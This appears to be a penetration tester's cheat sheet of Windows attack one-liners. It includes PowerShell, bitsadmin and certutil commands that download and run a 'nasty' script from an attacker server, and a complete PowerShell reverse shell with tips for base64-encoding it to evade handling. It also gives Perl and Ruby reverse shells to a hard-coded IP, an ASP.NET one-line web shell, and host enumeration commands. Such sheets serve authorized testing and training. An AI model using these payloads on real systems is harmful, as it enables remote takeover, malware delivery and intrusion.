##Check if CMD or Powershell (by PetSerA)
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell

----

##Show file content
type file.txt
more file.txt
Get-Content file.txt

----

#Download a file
#Powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://123.123.123.1/nastyscript.ps1")

#CMD
bitsadmin /transfer downloadJob /download /priority normal http://my.offensive.server/nasty.ps1 c:\nice.ps1
certutil.exe -urlcache -split -f "https://my.offensive.server/nasty.ps1" nice.ps1

----

##Reverse shell
$Oneliner = '$tcp_client=New-Object System.Net.Sockets.TCPClient("123.123.123.1",1234);$client_stream=$tcp_client.GetStream();[byte[]]$stream_bytes=0..65535|%{0};while(($i=$client_stream.Read($stream_bytes,0,$stream_bytes.Length)) -ne 0){;$stream_data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($stream_bytes,0,$i);$response=(iex $stream_data 2>&1 | Out-String );$response2=$response+"PS "+(pwd).Path + "> ";$response_byte=([text.encoding]::ASCII).GetBytes($response2);$client_stream.Write($response_byte,0,$response_byte.Length);$client_stream.Flush()};$tcp_client.Close()'

#Encoded to bytes if needed
$ToBytes = [System.Text.Encoding]::Unicode.GetBytes($Oneliner)

#Encoded to base64 if needed as a parameter etc.
$Base64Enc =[Convert]::ToBase64String($ToBytes)

!REMEMBER! make sure you use UTF16-LE, which for example Linux base64 does not do! (thanks to byt3bl33d3r!)
#Commandline for Unicode
echo "iex(command)" | iconv --to-code UTF-16LE | base64 -w 0
#Commandline for UTF8 ([System.Text.Encoding]::UTF8.GetBytes() won't work on exec
echo -n "abcd" | iconv -f UTF8 -t UTF16LE | base64
#Python
from base64 import b64encode
b64encode('iex(command)'.encode('UTF-16LE'))
#Ruby:
require "base64"
Base64.encode64('iex(command)'.force_encoding('UTF-16LE'))

#Thanks to UB3RSEC
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"123.123.123.1:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
ruby -rsocket -e 'c=TCPSocket.new("123.123.123.1","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

#You can listen for connections on nc -lnvp 1234 for example

----

##Web shell

#ASP.net oneliner webshell, thanks to Seguranca-informatica
#Call by issuing: http://123.123.123.1/shell.asp?cmd=dir
<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>

----

#Well-known-SIDs:
S-1-0-0                       Nobody        
S-1-1-0	                      Everybody
S-1-5-11                      Authenticated Users
S-1-5-18                      Local System
S-1-5-domainidentifier-500    Administrator

----

#Get installed apps info:
#64bit:
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
#32bit:
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

#List network connections
netstat -aon
#Show network interfaces
ipconfig /all
#Show routing table
route print

#System info
syteminfo

#User info
whoami
Get-LocalUser
whoami /groups

#Group info
Get-LocalGroup
Get-LocalGroupMember groupname

#Process Info
Get-Process
